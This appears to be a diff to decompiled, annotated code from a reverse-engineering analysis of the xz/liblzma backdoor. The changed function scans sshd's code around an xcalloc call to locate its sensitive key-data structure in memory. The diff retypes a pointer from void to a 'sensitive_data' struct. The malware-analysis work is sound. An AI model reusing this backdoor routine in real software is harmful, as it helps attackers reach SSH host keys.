@@ -1,7 +1,7 @@
 // /home/kali/xzre-ghidra/xzregh/103680_sshd_find_sensitive_data_base_via_xcalloc.c
 // Function: sshd_find_sensitive_data_base_via_xcalloc @ 0x103680
 // Calling convention: __stdcall
-// Prototype: BOOL __stdcall sshd_find_sensitive_data_base_via_xcalloc(u8 * data_start, u8 * data_end, u8 * code_start, u8 * code_end, string_references_t * string_refs, void * * sensitive_data_out)
+// Prototype: BOOL __stdcall sshd_find_sensitive_data_base_via_xcalloc(u8 * data_start, u8 * data_end, u8 * code_start, u8 * code_end, string_references_t * string_refs, sensitive_data * * sensitive_data_out)
 
 
 /*
@@ -12,7 +12,7 @@
 
 BOOL sshd_find_sensitive_data_base_via_xcalloc
                (u8 *data_start,u8 *data_end,u8 *code_start,u8 *code_end,
-               string_references_t *string_refs,void **sensitive_data_out)
+               string_references_t *string_refs,sensitive_data **sensitive_data_out)
 
 {
   u8 *xcalloc_call_target;
@@ -30,7 +30,7 @@ BOOL sshd_find_sensitive_data_base_via_xcalloc
   dasm_ctx_t store_probe_ctx;
   u8 *store_hits[16];
   
-  *sensitive_data_out = (void *)0x0;
+  *sensitive_data_out = (sensitive_data *)0x0;
   // AutoDoc: Use the precomputed string catalogue to seed the scan with the `xcalloc` call site.
   xcalloc_call_target = (u8 *)(string_refs->xcalloc_zero_size).func_start;
   if (xcalloc_call_target == (u8 *)0x0) {
@@ -109,9 +109,9 @@ LAB_00103802:
           hit_compare_idx = 0;
           do {
             // AutoDoc: Look for three slots spaced eight bytes apart; that stride matches the struct layout (base, base+8, base+0x10).
-            if (((void *)store_hits[clear_idx] == (void *)(store_hits[hit_scan_idx] + -8)) &&
+            if (((sensitive_data *)store_hits[clear_idx] == (sensitive_data *)(store_hits[hit_scan_idx] + -8)) &&
                (store_hits[hit_scan_idx] == store_hits[hit_compare_idx] + -8)) {
-              *sensitive_data_out = (void *)store_hits[clear_idx];
+              *sensitive_data_out = (sensitive_data *)store_hits[clear_idx];
               return TRUE;
             }
             hit_compare_idx = hit_compare_idx + 1;
